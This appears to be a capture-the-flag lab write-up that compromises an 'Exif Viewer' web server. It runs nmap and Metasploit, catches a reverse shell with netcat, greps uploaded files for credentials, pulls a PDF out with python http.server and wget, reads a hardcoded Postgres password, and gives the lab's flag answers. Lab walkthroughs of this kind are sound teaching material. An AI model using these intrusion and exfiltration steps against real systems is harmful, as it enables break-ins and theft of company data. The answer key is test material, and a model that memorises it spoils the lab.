# 03 - Data Heist (Lab)

We have noticed that there are some employees in our company who are not sufficiently aware of cybersecurity issues. It has been observed that these employees have uploaded files containing company data to a website called "Exif Viewer" in order to view metadata information.

The site claims that it does not store the uploaded files. However, we have to make sure that this is the case. If any of our company's files have been compromised in this process, we need to determine what information may be at risk. You are expected to guide us through this critical process. We rely on your expertise.

Question 1: What is the path where the files are stored on the server?

Lets start by performing a nmap scan to identify open ports and services on the target machine.

```
nmap -sSVC 172.20.49.87
```
```
PORT      STATE SERVICE  VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 5a:bc:c1:64:1b:a8:93:67:8c:a5:3a:c9:5e:28:94:50 (RSA)
|   256 71:07:65:ed:45:e7:b6:a5:18:c4:89:be:bc:fe:fb:01 (ECDSA)
|_  256 1f:7f:9d:f3:96:52:6f:b8:90:7e:dc:8e:b2:d6:2c:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Exif Viewer
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The target is running an Apache web server on port 80. Let's look if Exif Viewer is vulnerable.

```
msfconsole
search exif viewer
```

![](Assets/Pasted%20image%2020251028145427.png)

Here we have a bunch of exploits for this tool.

Lets use the first one.

![](Assets/Pasted%20image%2020251028145921.png)

We have created a file to upload to the server.
First lets make a nc listener on port 4444
```
nc -lvnp 4444
```

![](Assets/Pasted%20image%2020251028151034.png)

Great here we have a reverse shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Afte enumerating a while we have the first awnser that is the path where the files are stored on the server.
Answer: /var/www/93c0550a5543b366_uploads

Question 2: What is the e-mail address and password of an employee of the company "waltersltd" from the data contained in the stored files?

Lets look for any files that may contain this information.
```
grep -r "waltersltd" /var/www/93c0550a5543b366_uploads
```

![](Assets/Pasted%20image%2020251028151345.png)

Answer: salvarado@waltersltd.hv:hGCQjxZs5chK

Question 3: What is the invoice number of an invoice found in the stored files?

On the same directory we have an Ja23s6_techinnovations_invoice.pdf file. Lets download it.
```
python3 -m http.server 8000
wget http://172.20.49.87:8000/Ja23s6_techinnovations_invoice.pdf
```

![](Assets/Pasted%20image%2020251028151720.png)

Answer: INV-20240228-1234

Question 4: What is the database connection address of the files contained in the stored files?

Lets look for any files that may contain this information.
```
ls -la
```
We found a database.go file. Lets read it.
```
cat database.go
```
```
func main() {
        // Database connection string
        connStr := "postgres://postgres:JS3CqjNCcn7Ve@olympusbytes.hv:5432/olympus"
        db, err := sql.Open("postgres", connStr)
}
```
Now lets connect to the database using the above credentials.

Answer: olympusbytes.hv